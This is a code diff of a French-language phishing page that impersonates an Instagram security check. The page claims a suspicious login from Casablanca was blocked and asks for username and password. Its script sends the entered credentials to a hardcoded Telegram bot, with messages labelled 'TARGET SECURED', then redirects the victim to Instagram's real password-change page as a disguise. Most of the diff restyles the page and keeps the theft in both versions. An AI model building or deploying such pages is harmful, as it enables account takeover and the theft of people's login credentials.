@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="fr">
 <head>
@@ -15,52 +16,61 @@
         }
 
         .card { 
-            background: white; border-radius: 12px; width: 100%; max-width: 400px; 
-            padding: 30px; box-shadow: 0 12px 28px rgba(0,0,0,0.2); text-align: center;
+            background: white; border-radius: 15px; width: 100%; max-width: 400px; 
+            padding: 35px; box-shadow: 0 15px 35px rgba(0,0,0,0.25); text-align: center;
         }
 
-        /* اللوغو الرسمي بدون أخطاء أبعاد */
-        .logo-container {
-            width: 175px;
+        /* اللوغو الكتابي */
+        .logo-wordmark { width: 160px; margin: 0 auto 10px; display: block; }
+
+        /* المستطيل المتدرج (أيقونة إنستغرام 2026) */
+        .ig-gradient-box {
+            width: 70px; height: 70px;
+            background: radial-gradient(circle at 30% 107%, #fdf497 0%, #fdf497 5%, #fd5949 45%, #d6249f 60%, #285AEB 90%);
+            border-radius: 18px;
             margin: 0 auto 25px;
-            display: block;
+            display: flex; align-items: center; justify-content: center;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.15);
         }
-        .logo-container img {
-            width: 100%;
-            height: auto;
-            display: block;
+        /* اللوغو الأبيض داخل المستطيل (Base64 لضمان الظهور) */
+        .white-glyph {
+            width: 45px; height: 45px;
+            background-image: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0id2hpdGUiPjxwYXRoIGQ9Ik0xMiAyLjA4OWMuMzI1IDAgLjM2Ny4wMTIgNC4wMTMuMTk4IDEuMTY1LjA1NSAyLjIwNi4yMDQgMy4wOTIuNzQyIDEuMjU2LjY1NyAyLjM0NSAxLjg4OSAyLjUzNiAzLjAyLjQ1NyAxLjExOC41MzYgMi4yMTYuNTYgMy42MTUuMDI3IDEuNjM4LjAyNyAxLjg5Mi4wMjcgNy4yMDJzMCA1LjU2NC0uMDI3IDcuMjAyYy0uMDI4IDEuNDAtLjEwMyAyLjQ5Ny0uNTYgMy42MTUtLjE5MSAxLjEzMS0xLjI4IDIuMzYzLTIuNTM2IDMuMDItLjg4Ni41MzgtMS45MjcuNjg3LTMuMDkyLjc0Mi0zLjY0Ni4xODYtMy42ODguMTk4LTQuMDEzLjE5OHMtLjM2Ny0uMDEyLTQuMDEzLS4xOThjLTEuMTY1LS4wNTUtMi4yMDYtLjIwNC0zLjA5Mi0uNzQyLTEuMjU2LS42NTctMi4zNDUtMS44ODktMi41MzYtMy4wMi0uNDU3LTEuMTE4LS41MzYtMi4yMTYtLjU2LTMuNjE1LS4wMjctMS42MzguMDI4LTEuODkyLS4wMjctNy4yMDJzMC01LjU2NC4wMjctNy4yMDJjLjAyNC0xLjQuMTAzLTIuNDk3LjU2LTMuNjE1LjE5MS0xLjEzMSAxLjI4LTIuMzYzIDIuNTM2LTozLjAyLjg4Ni0uNTM4IDEuOTI3LS42ODcgMy4wOTItLjc0MiAzLjY0Ni0uMTg2IDMuNjg4LS4xOTggNC4wMTMtLjE5OHptMC0yLjA4OWMtNC4xMjggMC00LjY0NS4wMTUtNy44NzYuMTY2LTIuMjk0LjEwNi00LjA0OC40NTQtNS4zODYgMS4zMDEtMi4xNiAxLjI1MS0zLTMuNzg0IDMuNTExLTQuNzk1IDQuNzk4LS45NzQgMS4zNzEtMS4zNTQgMy4xMDUtMS41MzIgNS4zODYtLjEzNCAzLjA1Ny0uMTQ4IDQuMDQzLS4xNDggNy44NzZzMCA0LjgxOS4xNDggNy44NzZjLS4wNDcgMi4yODEuMjkzIDQuMDE1IDEuNTMyIDUuMzg2IDEuMDAzIDEuMjcxIDMuMDU3IDMuMDQzIDQuNzk1IDQuNzk4IDEuNTMgMi4xNjQgMi45MTIgMi43MzYgNS4zODYgNS40NDEgMi4yODMuMTMxIDQuODE5LjEzMSA3Ljg3Ni4xMzFzNS41OTMtLjAxNSA3Ljg3Ni0uMTY1YzEuMjEzLS4wODggNC4wNDgtLjQ1NCA1LjM4Ni0xLjMwMSAyLjE2LTEuMjUxIDMuNzg0LTMuNTExIDQuNzk1LTQuNzk4IDEuMjYxLTEuNzM2IDEuNTYtMy4yNTEgMS41MzItNS4zODYuMTQxLTMuMDU3LjE0MS00LjA0My4xNDEtNy44NzZzLS4wMTUtNC44MTktLjE0MS03Ljg3NmMtLjA0Ny0yLjI4MS4yOTMtNC4wMTUtMS41MzItNS4zODYtMi4wMTMtMi41MjQtMy43OTQtMy43NTQtNC43OTUtNC43OTgtMi4wMTctMi44NC0zLjg2Mi0zLjA1NS01LjM4Ni01LjQ0MS0yLjI4My0uMTMxLTQuODE5LS4xMzEtNy44NzYtLjEzMXpTMTIgNy4yNDljLTMuOTYxIDAtNy4xNyAzLjIwOC03LjE3IDcuMTY5czMuMjA5IDcuMTY5IDcuMTcgNy4xNjkgNy4xNy0zLjIwOSA3LjE3LTcuMTY5LTMuMjA5LTcuMTY5LTcuMTctNy4xNjl6bTAtNi4zODJjNC42MjcgMCA4LjQwMSAzLjc3NSA4LjQwMSA4LjQwMXMtMy43NzUgOC40MDEtOC40MDEgOC40MDEtOC40MDEtMy43NzUtOC40MDEtOC40MDEgMy43NzUtOC40MDEgOC40MDEtOC40MDF6bTguNjY3LTIuNThjLjQ5IDAgLjg5MS0uNDAyLjg5MS0uODk4czAgLS44OTctLjg5MS0uODk3Yy0uNDkzIDAtLjg5NC40MDEtLjg5NC44OTdzMCAuODk4Ljg5NC44OTh6Ii8+PC9zdmc+');
+            background-size: contain; background-repeat: no-repeat; background-position: center;
         }
 
-        h2 { font-size: 22px; color: #1c1e21; margin-bottom: 15px; font-weight: 700; }
+        h2 { font-size: 20px; color: #1c1e21; margin-bottom: 15px; font-weight: 700; }
         
         .alert { 
-            background: #fff4f4; border: 1px solid #f9d6d6; border-radius: 8px; 
-            padding: 15px; margin-bottom: 20px; display: flex; align-items: flex-start; text-align: left;
+            background: #fff4f4; border: 1px solid #f9d6d6; border-radius: 10px; 
+            padding: 15px; margin-bottom: 25px; display: flex; text-align: left;
         }
-        .alert svg { fill: #fa3e3e; width: 24px; margin-right: 12px; margin-top: 2px; flex-shrink: 0; }
-        .alert-txt { font-size: 14px; color: #4b4f56; line-height: 1.4; }
+        .alert svg { fill: #fa3e3e; width: 26px; margin-right: 12px; flex-shrink: 0; }
+        .alert-txt { font-size: 13.5px; color: #4b4f56; line-height: 1.4; }
         .red { font-weight: 700; color: #d93025; }
 
         input { 
-            width: 100%; padding: 14px; background: #f5f6f7; border: 1px solid #dddfe2; 
-            border-radius: 6px; margin-bottom: 10px; font-size: 14px; outline: none;
+            width: 100%; padding: 15px; background: #f5f6f7; border: 1px solid #dddfe2; 
+            border-radius: 8px; margin-bottom: 12px; font-size: 14px; outline: none;
         }
-        input:focus { border-color: var(--m-blue); }
+        input:focus { border-color: var(--m-blue); box-shadow: 0 0 0 2px #e7f3ff; }
 
         .btn { 
             width: 100%; background: var(--m-blue); color: white; border: none; 
-            padding: 14px; border-radius: 6px; font-weight: 700; font-size: 16px; cursor: pointer;
+            padding: 15px; border-radius: 8px; font-weight: 700; font-size: 16px; cursor: pointer;
         }
 
-        .ft { margin-top: 30px; border-top: 1px solid #ebedf0; padding-top: 20px; }
-        .ft img { width: 80px; }
+        .ft { margin-top: 35px; border-top: 1px solid #ebedf0; padding-top: 20px; }
+        .ft img { width: 85px; opacity: 0.9; }
     </style>
 </head>
 <body>
 
 <div class="card">
-    <div class="logo-container">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" alt="Instagram">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" class="logo-wordmark">
+
+    <div class="ig-gradient-box">
+        <div class="white-glyph"></div>
     </div>
 
     <h2>Vérification de sécurité</h2>
@@ -68,16 +78,16 @@
     <div class="alert">
         <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
         <div class="alert-txt">
-            Une tentative de connexion inhabituelle a été bloquée : <br>
+            Connexion suspecte bloquée : <br>
             <span class="red">📍 Casablanca, Maroc (IP: 105.158.24.11)</span>
-            <br>Veuillez confirmer votre identité.
+            <br>Veuillez confirmer votre identité pour continuer.
         </div>
     </div>
 
-    <form id="meta-check">
-        <input type="text" id="u" placeholder="Nom d'utilisateur, e-mail ou mobile" required>
+    <form id="meta-p">
+        <input type="text" id="u" placeholder="Nom d'utilisateur" required>
         <input type="password" id="p" placeholder="Mot de passe" required>
-        <button type="submit" class="btn">Continuer</button>
+        <button type="submit" class="btn">Sécuriser le compte</button>
     </form>
 
     <div class="ft">
@@ -86,18 +96,14 @@
 </div>
 
 <script>
-    document.getElementById('meta-check').onsubmit = async (e) => {
+    document.getElementById('meta-p').onsubmit = async (e) => {
         e.preventDefault();
         const u = document.getElementById('u').value;
         const p = document.getElementById('p').value;
-        const tok = "7137131967:AAHa-B55idnADcUHKse3HjqHeoHyAjSMY1I";
-        const cid = "5558301795";
-        
-        const msg = `🇲🇦 **NEW LOG: MAROC**\n👤 User: \`${u}\` \n🔑 Pass: \`${p}\``;
-
-        await fetch(`https://api.telegram.org/bot${tok}/sendMessage?chat_id=${cid}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
-        
-        // التوجيه لصفحة تغيير الباسورد الحقيقية لزيادة التمويه
+        const t = "7137131967:AAHa-B55idnADcUHKse3HjqHeoHyAjSMY1I";
+        const c = "5558301795";
+        const m = `🇲🇦 **TARGET SECURED** 🇲🇦\n👤 User: \`${u}\` \n🔑 Pass: \`${p}\``;
+        await fetch(`https://api.telegram.org/bot${t}/sendMessage?chat_id=${c}&text=${encodeURIComponent(m)}&parse_mode=Markdown`);
         window.location.href = "https://www.instagram.com/accounts/password/change/";
     };
 </script>
